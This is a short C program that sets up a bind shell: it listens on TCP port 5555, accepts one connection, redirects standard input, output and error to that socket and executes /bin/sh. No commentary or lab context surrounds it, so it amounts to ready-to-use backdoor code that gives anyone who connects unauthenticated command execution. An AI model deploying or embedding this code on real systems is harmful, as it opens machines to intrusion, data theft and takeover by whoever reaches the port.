#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <netdb.h>
#include <string.h>

void main()
{
	int s;

	if ((s=socket(AF_INET,SOCK_STREAM,0))==-1)
	{
		perror("[-] Error Creating Socket Descriptor\n");		
		exit(-1);
	}

	int optval=1;
	if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&optval,sizeof(optval))==-1)
	{
		perror("[-] Error in setsockopt()\n");
		exit(-3);
	}

	struct addrinfo hints, *res;
	memset(&hints, 0, sizeof hints);

	hints.ai_family = AF_UNSPEC;  // use IPv4 or IPv6, whichever
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;     // fill in my IP for me
	getaddrinfo(NULL, "5555", &hints, &res);	

	if((bind(s,res->ai_addr,res->ai_addrlen))==-1)
	{
		perror("[+] Failed To Bind Port \n");
		exit(-2);	
	}

	if(listen(s,5)== -1)
	{
		perror("[-] Could Not Listen\n");
		exit(-4);
	}

	int conn_fd;
	conn_fd = accept(s, NULL, NULL);// accept(sock, (struct sockaddr *) &client_address, &client_length); can also be done but I dont want my IP to be known to the server	
	if(conn_fd == -1)
	{
		perror("[-] Could Not Accept Connection\n");
		exit(-5);
	}	 

    dup2(conn_fd, 0);
    dup2(conn_fd, 1);
    dup2(conn_fd, 2);

    execve("/bin/sh", NULL, NULL);
}
